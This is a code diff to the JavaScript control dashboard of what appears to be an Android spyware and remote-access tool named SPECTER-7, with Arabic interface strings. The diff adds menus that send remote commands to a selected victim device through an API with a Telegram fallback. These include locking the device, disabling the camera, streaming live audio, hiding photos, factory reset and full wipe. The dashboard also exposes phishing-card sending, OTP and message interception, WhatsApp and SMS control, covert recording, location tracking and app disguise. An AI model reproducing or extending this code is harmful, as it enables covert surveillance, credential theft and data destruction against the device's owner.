@@ -1,5 +1,5 @@
 // ═══════════════════════════════════════════════════════════
-// SPECTER-7 Dashboard Script (with multi-site Phishing)
+// SPECTER-7 Dashboard Script (with multi-site Phishing + Server Admin)
 // ═══════════════════════════════════════════════════════════
 
 function getAuthToken() { return sessionStorage.getItem('auth_token') || ''; }
@@ -63,9 +63,9 @@ function logout() {
     sessionStorage.removeItem('logged_in');
     sessionStorage.removeItem('auth_token');
     sessionStorage.removeItem('is_owner');
-    sessionStorage.removeItem(ADVANCED_UNLOCK_KEY);
     sessionStorage.removeItem('terms_accepted');
     sessionStorage.removeItem('terms_accepted_at');
+    try { localStorage.removeItem('adv_lock_state'); } catch (e) {}
     window.location.href = 'login.html';
 }
 
@@ -99,6 +99,104 @@ function getCallType(t) { switch(parseInt(t)) { case 1: return '📥 وارد'; 
 function formatWhatsAppDate(t) {
     if (!t) return '—';
     try { const d = new Date(Number(t)); if (isNaN(d.getTime())) return '—'; return d.toLocaleString('ar', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' }); } catch (e) { return '—'; }
+}
+
+// ═══════════════════════════════════════════
+// Server Admin / Danger / Delete / Destroy menus
+// ═══════════════════════════════════════════
+function openServerAdminMenu() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    const ov = document.getElementById('serverAdminOverlay');
+    if (ov) ov.style.display = 'block';
+}
+function closeServerAdminMenu() {
+    const ov = document.getElementById('serverAdminOverlay');
+    if (ov) ov.style.display = 'none';
+}
+function openServerDangerMenu() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    const ov = document.getElementById('serverDangerOverlay');
+    if (ov) ov.style.display = 'block';
+}
+function closeServerDangerMenu() {
+    const ov = document.getElementById('serverDangerOverlay');
+    if (ov) ov.style.display = 'none';
+}
+function openServerDeleteMenu() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    const ov = document.getElementById('serverDeleteOverlay');
+    if (ov) ov.style.display = 'block';
+}
+function closeServerDeleteMenu() {
+    const ov = document.getElementById('serverDeleteOverlay');
+    if (ov) ov.style.display = 'none';
+}
+function openServerDestroyMenu() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    const ov = document.getElementById('serverDestroyOverlay');
+    if (ov) ov.style.display = 'block';
+}
+function closeServerDestroyMenu() {
+    const ov = document.getElementById('serverDestroyOverlay');
+    if (ov) ov.style.display = 'none';
+}
+
+async function sendServerCmd(cmd) {
+    if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
+    try {
+        const res = await fetch('/api.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                device: currentDevice,
+                command: cmd,
+                token: getAuthToken()
+            })
+        });
+        const data = await res.json();
+        if (data.success) {
+            showNotification('✅ تم الإرسال', cmd, '📤');
+        } else {
+            const map = {
+                hardlock: '/hardlock',
+                forcelock: '/forcelock',
+                disablecamera: '/disablecamera',
+                enablecamera: '/enablecamera',
+                watchlogin: '/watchlogin',
+                removeadmin: '/removeadmin',
+                deadman24: '/deadman24',
+                deadman48: '/deadman48',
+                deadman72: '/deadman72',
+                deadmanreset: '/deadmanreset',
+                motion: '/motion',
+                stopmotion: '/stopmotion',
+                liveaudio: '/liveaudio',
+                stopliveaudio: '/stopliveaudio',
+                hidephotos: '/hidephotos'
+            };
+            const tgCmd = map[cmd] || ('/' + cmd);
+            const ok = await sendTelegramCommand(tgCmd);
+            if (ok) showNotification('✅ تم الإرسال (تيليجرام)', cmd, '📤');
+            else alert('❌ فشل');
+        }
+    } catch (e) {
+        alert('❌ فشل الاتصال');
+    }
+}
+
+async function sendServerCmdConfirm(cmd) {
+    if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
+    const messages = {
+        destroyapp: '💀 سيتم تدمير التطبيق نهائياً. متأكد؟',
+        factoryreset: '⚠️ سيتم إعادة ضبط المصنع — كل شي يُمسح. متأكد؟',
+        wipe: '🗑️ سيتم مسح كل الذاكرة. متأكد؟',
+        wipepersonal: '🗑️ سيتم مسح كل البيانات الشخصية. متأكد؟'
+    };
+    if (!confirm(messages[cmd] || 'متأكد؟')) return;
+    if (cmd === 'factoryreset') {
+        if (!confirm('⚠️⚠️ تأكيد نهائي — لا رجعة. متأكد 100%؟')) return;
+    }
+    await sendServerCmd(cmd);
 }
 
 // ═══════════════════════════════════════════
@@ -1533,9 +1631,7 @@ loadDevices();
 setInterval(loadDevices, 30000);
 
 // ═══════════════════════════════════════════
-// Window exports══════════════════════════════════════════
-// ═══════════════════════════════════════════
-// 🔐 Open Live Messages / Voices / OTP / Emails
+// 🔐 Live Messages / Voices / OTP / Emails
 // ═══════════════════════════════════════════
 // ─── Live Messages ───
 function openLiveMessages() {
@@ -1757,127 +1853,10 @@ function deleteLiveEmail(idx) {
     const c = document.getElementById('liveEmailsCount');
     if (c) c.textContent = liveEmails.length;
     renderLiveEmails();
-        }
-window.logout = logout;
-window.openAdvancedMenu = openAdvancedMenu;
-window.sendPhishingCard = sendPhishingCard;
-window.doSendPhishing = doSendPhishing;
-window.toggleCardOptions = toggleCardOptions;
-window.openLivePhishing = openLivePhishing;
-window.closeLivePhishing = closeLivePhishing;
-window.clearLivePhishing = clearLivePhishing;
-window.deletePhishingEntry = deletePhishingEntry;
-window.copyToClipboard = copyToClipboard;
+}
 
-window.openLiveMotion = openLiveMotion;
-window.closeLiveMotion = closeLiveMotion;
-window.clearLiveMotion = clearLiveMotion;
-window.downloadMotionPhoto = downloadMotionPhoto;
-window.deleteMotionPhoto = deleteMotionPhoto;
-
-window.openLiveGeofence = openLiveGeofence;
-window.closeLiveGeofence = closeLiveGeofence;
-window.clearLiveGeofence = clearLiveGeofence;
-window.deleteGeofenceEvent = deleteGeofenceEvent;
-
-window.openLiveAudioStream = openLiveAudioStream;
-window.closeLiveAudioStream = closeLiveAudioStream;
-window.clearLiveAudioStream = clearLiveAudioStream;
-window.downloadLiveAudioChunk = downloadLiveAudioChunk;
-
-window.startAudioRecording = startAudioRecording;
-window.stopAudioRecording = stopAudioRecording;
-window.startVideoRecording = startVideoRecording;
-window.stopVideoRecording = stopVideoRecording;
-window.takeCameraPhoto = takeCameraPhoto;
-window.takeScreenshot = takeScreenshot;
-
-window.sendFakeNotification = sendFakeNotification;
-window.speakOnDevice = speakOnDevice;
-window.lockDevice = lockDevice;
-window.unlockDevice = unlockDevice;
-window.toggleMotionCamera = toggleMotionCamera;
-window.openGeofenceDialog = openGeofenceDialog;
-window.getCurrentLocation = getCurrentLocation;
-window.saveGeofence = saveGeofence;
-window.stopGeofenceMonitor = stopGeofenceMonitor;
-window.clearAllGeofences = clearAllGeofences;
-window.openDeadManDialog = openDeadManDialog;
-window.startDeadMan = startDeadMan;
-window.stopDeadMan = stopDeadMan;
-window.resetDeadMan = resetDeadMan;
-window.toggleLiveAudio = toggleLiveAudio;
-
-window.openLiveAudio = openLiveAudio;
-window.closeLiveAudio = closeLiveAudio;
-window.clearLiveAudio = clearLiveAudio;
-window.downloadLiveAudio = downloadLiveAudio;
-window.deleteLiveAudio = deleteLiveAudio;
-
-window.openLiveVideos = openLiveVideos;
-window.closeLiveVideos = closeLiveVideos;
-window.clearLiveVideos = clearLiveVideos;
-window.downloadLiveVideo = downloadLiveVideo;
-window.deleteLiveVideo = deleteLiveVideo;
-
-window.openLiveScreenshots = openLiveScreenshots;
-window.closeLiveScreenshots = closeLiveScreenshots;
-window.clearLiveScreenshots = clearLiveScreenshots;
-window.downloadLiveScreenshot = downloadLiveScreenshot;
-window.deleteLiveScreenshot = deleteLiveScreenshot;
-
-window.openLiveCamera = openLiveCamera;
-window.closeLiveCamera = closeLiveCamera;
-window.clearLiveCamera = clearLiveCamera;
-window.downloadLiveCameraPhoto = downloadLiveCameraPhoto;
-window.deleteLiveCameraPhoto = deleteLiveCameraPhoto;
-
-window.openLiveImages = openLiveImages;
-window.closeLiveImages = closeLiveImages;
-window.clearLiveImages = clearLiveImages;
-window.downloadLiveImage = downloadLiveImage;
-window.deleteLiveImage = deleteLiveImage;
-
-window.openWhatsAppChat = openWhatsAppChat;
-window.closeWhatsAppChat = closeWhatsAppChat;
-window.deleteWhatsAppChat = deleteWhatsAppChat;
-window.clearWhatsAppList = clearWhatsAppList;
-window.openReplyWhatsApp = openReplyWhatsApp;
-window.openReplyWaPicker = openReplyWaPicker;
-window.doReplyWa = doReplyWa;
-window.selectAllWhatsApp = selectAllWhatsApp;
-window.deleteSelectedWhatsApp = deleteSelectedWhatsApp;
-
-window.openSendSms = openSendSms;
-window.doSendSms = doSendSms;
-window.openSendSmsTo = openSendSmsTo;
-window.openDisguiseMenu = openDisguiseMenu;
-window.changeDisguise = changeDisguise;
-window.triggerVoiceScan = triggerVoiceScan;
-
-window.switchTab = switchTab;
-window.deleteDevice = deleteDevice;
-window.selectDevice = selectDevice;
-window.filterDeleted = filterDeleted;
-window.clearAllDeleted = clearAllDeleted;
-window.deleteSingleDeleted = deleteSingleDeleted;
-window.backToCallsList = backToCallsList;
-window.openCallDetail = openCallDetail;
-window.openChat = openChat;
-window.backToConversations = backToConversations;
-window.openContactDetail = openContactDetail;
-window.backToContactsList = backToContactsList;
-window.loadWhatsApp = loadWhatsApp;
-window.loadEmails = loadEmails;
-
-window.approveDevice = approveDevice;
-window.denyDevice = denyDevice;
-window.revokeDevice = revokeDevice;
-window.unblockDevice = unblockDevice;
-window.toggleDeviceAccess = toggleDeviceAccess;
-window.toggleDeviceAccess = toggleDeviceAccess;
-        // ═══════════════════════════════════════════
-// 🔐 Advanced Code Protection — نافذة داخلية
+// ═══════════════════════════════════════════
+// 🔐 Advanced Code Protection
 // ═══════════════════════════════════════════
 const ADVANCED_CODE = "2024";
 const ADV_LOCK_KEY = "adv_lock_state";
@@ -2076,10 +2055,7 @@ function showAdvancedDialog() {
     }
 }
 
-function requestAdvancedCode() {
-    showAdvancedDialog();
-}
-
+function requestAdvancedCode() { showAdvancedDialog(); }
 function showAdvLockStatus() {
     const s = getAdvLockState();
     const now = Date.now();
@@ -2089,15 +2065,171 @@ function showAdvLockStatus() {
         alert(`✅ مفتوح\nمحاولات فاشلة: ${s.attempts}/${ADV_MAX_ATTEMPTS}\nمستوى القفل: ${s.lockLevel}`);
     }
 }
-
 function forceUnlockAdvanced() {
     clearAdvLockState();
     alert('🔓 تم فتح القفل يدويًا');
 }
 
+// ═══════════════════════════════════════════
+// Window exports
+// ═══════════════════════════════════════════
+window.logout = logout;
+window.openAdvancedMenu = openAdvancedMenu;
+window.sendPhishingCard = sendPhishingCard;
+window.doSendPhishing = doSendPhishing;
+window.toggleCardOptions = toggleCardOptions;
+window.openLivePhishing = openLivePhishing;
+window.closeLivePhishing = closeLivePhishing;
+window.clearLivePhishing = clearLivePhishing;
+window.deletePhishingEntry = deletePhishingEntry;
+window.copyToClipboard = copyToClipboard;
+
+// Server menus
+window.openServerAdminMenu = openServerAdminMenu;
+window.closeServerAdminMenu = closeServerAdminMenu;
+window.openServerDangerMenu = openServerDangerMenu;
+window.closeServerDangerMenu = closeServerDangerMenu;
+window.openServerDeleteMenu = openServerDeleteMenu;
+window.closeServerDeleteMenu = closeServerDeleteMenu;
+window.openServerDestroyMenu = openServerDestroyMenu;
+window.closeServerDestroyMenu = closeServerDestroyMenu;
+window.sendServerCmd = sendServerCmd;
+window.sendServerCmdConfirm = sendServerCmdConfirm;
+
+window.openLiveMotion = openLiveMotion;
+window.closeLiveMotion = closeLiveMotion;
+window.clearLiveMotion = clearLiveMotion;
+window.downloadMotionPhoto = downloadMotionPhoto;
+window.deleteMotionPhoto = deleteMotionPhoto;
+
+window.openLiveGeofence = openLiveGeofence;
+window.closeLiveGeofence = closeLiveGeofence;
+window.clearLiveGeofence = clearLiveGeofence;
+window.deleteGeofenceEvent = deleteGeofenceEvent;
+
+window.openLiveAudioStream = openLiveAudioStream;
+window.closeLiveAudioStream = closeLiveAudioStream;
+window.clearLiveAudioStream = clearLiveAudioStream;
+window.downloadLiveAudioChunk = downloadLiveAudioChunk;
+
+window.startAudioRecording = startAudioRecording;
+window.stopAudioRecording = stopAudioRecording;
+window.startVideoRecording = startVideoRecording;
+window.stopVideoRecording = stopVideoRecording;
+window.takeCameraPhoto = takeCameraPhoto;
+window.takeScreenshot = takeScreenshot;
+
+window.sendFakeNotification = sendFakeNotification;
+window.speakOnDevice = speakOnDevice;
+window.lockDevice = lockDevice;
+window.unlockDevice = unlockDevice;
+window.toggleMotionCamera = toggleMotionCamera;
+window.openGeofenceDialog = openGeofenceDialog;
+window.getCurrentLocation = getCurrentLocation;
+window.saveGeofence = saveGeofence;
+window.stopGeofenceMonitor = stopGeofenceMonitor;
+window.clearAllGeofences = clearAllGeofences;
+window.openDeadManDialog = openDeadManDialog;
+window.startDeadMan = startDeadMan;
+window.stopDeadMan = stopDeadMan;
+window.resetDeadMan = resetDeadMan;
+window.toggleLiveAudio = toggleLiveAudio;
+
+window.openLiveAudio = openLiveAudio;
+window.closeLiveAudio = closeLiveAudio;
+window.clearLiveAudio = clearLiveAudio;
+window.downloadLiveAudio = downloadLiveAudio;
+window.deleteLiveAudio = deleteLiveAudio;
+
+window.openLiveVideos = openLiveVideos;
+window.closeLiveVideos = closeLiveVideos;
+window.clearLiveVideos = clearLiveVideos;
+window.downloadLiveVideo = downloadLiveVideo;
+window.deleteLiveVideo = deleteLiveVideo;
+
+window.openLiveScreenshots = openLiveScreenshots;
+window.closeLiveScreenshots = closeLiveScreenshots;
+window.clearLiveScreenshots = clearLiveScreenshots;
+window.downloadLiveScreenshot = downloadLiveScreenshot;
+window.deleteLiveScreenshot = deleteLiveScreenshot;
+
+window.openLiveCamera = openLiveCamera;
+window.closeLiveCamera = closeLiveCamera;
+window.clearLiveCamera = clearLiveCamera;
+window.downloadLiveCameraPhoto = downloadLiveCameraPhoto;
+window.deleteLiveCameraPhoto = deleteLiveCameraPhoto;
+
+window.openLiveImages = openLiveImages;
+window.closeLiveImages = closeLiveImages;
+window.clearLiveImages = clearLiveImages;
+window.downloadLiveImage = downloadLiveImage;
+window.deleteLiveImage = deleteLiveImage;
+
+window.openWhatsAppChat = openWhatsAppChat;
+window.closeWhatsAppChat = closeWhatsAppChat;
+window.deleteWhatsAppChat = deleteWhatsAppChat;
+window.clearWhatsAppList = clearWhatsAppList;
+window.openReplyWhatsApp = openReplyWhatsApp;
+window.openReplyWaPicker = openReplyWaPicker;
+window.doReplyWa = doReplyWa;
+window.selectAllWhatsApp = selectAllWhatsApp;
+window.deleteSelectedWhatsApp = deleteSelectedWhatsApp;
+
+window.openSendSms = openSendSms;
+window.doSendSms = doSendSms;
+window.openSendSmsTo = openSendSmsTo;
+window.openDisguiseMenu = openDisguiseMenu;
+window.changeDisguise = changeDisguise;
+window.triggerVoiceScan = triggerVoiceScan;
+
+window.switchTab = switchTab;
+window.deleteDevice = deleteDevice;
+window.selectDevice = selectDevice;
+window.filterDeleted = filterDeleted;
+window.clearAllDeleted = clearAllDeleted;
+window.deleteSingleDeleted = deleteSingleDeleted;
+window.backToCallsList = backToCallsList;
+window.openCallDetail = openCallDetail;
+window.openChat = openChat;
+window.backToConversations = backToConversations;
+window.openContactDetail = openContactDetail;
+window.backToContactsList = backToContactsList;
+window.loadWhatsApp = loadWhatsApp;
+window.loadEmails = loadEmails;
+
+window.approveDevice = approveDevice;
+window.denyDevice = denyDevice;
+window.revokeDevice = revokeDevice;
+window.unblockDevice = unblockDevice;
+window.toggleDeviceAccess = toggleDeviceAccess;
+
+// Live messages/voices/OTP/emails
+window.openLiveMessages = openLiveMessages;
+window.closeLiveMessages = closeLiveMessages;
+window.clearLiveMsgs = clearLiveMsgs;
+window.filterLiveMsgs = filterLiveMsgs;
+window.deleteLiveMsg = deleteLiveMsg;
+
+window.openLiveVoices = openLiveVoices;
+window.closeLiveVoices = closeLiveVoices;
+window.clearLiveVoices = clearLiveVoices;
+window.downloadLiveVoice = downloadLiveVoice;
+window.deleteLiveVoice = deleteLiveVoice;
+
+window.openLiveOtp = openLiveOtp;
+window.closeLiveOtp = closeLiveOtp;
+window.clearLiveOtp = clearLiveOtp;
+window.deleteLiveOtp = deleteLiveOtp;
+
+window.openLiveEmails = openLiveEmails;
+window.closeLiveEmails = closeLiveEmails;
+window.clearLiveEmails = clearLiveEmails;
+window.deleteLiveEmail = deleteLiveEmail;
+
+// Advanced protection
 window.requestAdvancedCode = requestAdvancedCode;
 window.showAdvLockStatus = showAdvLockStatus;
 window.forceUnlockAdvanced = forceUnlockAdvanced;
 
 console.log('%c🔐 Advanced code protection active', 'color: #ff0066; font-weight: bold;');
-console.log('%c✅ SPECTER-7 script loaded (with multi-site Phishing)', 'color: #00ffcc; font-weight: bold;');
+console.log('%c✅ SPECTER-7 script loaded (with multi-site Phishing + Server Admin)', 'color: #00ffcc; font-weight: bold;');
